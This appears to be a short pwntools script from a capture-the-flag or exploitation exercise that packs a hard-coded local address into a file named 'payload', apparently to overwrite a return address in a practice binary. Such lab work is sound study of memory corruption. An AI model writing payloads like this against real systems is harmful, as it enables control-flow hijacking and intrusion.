from pwn import *

addr = 0x5555555551ea

with open('payload', 'wb') as f:
	f.write(p64(addr))
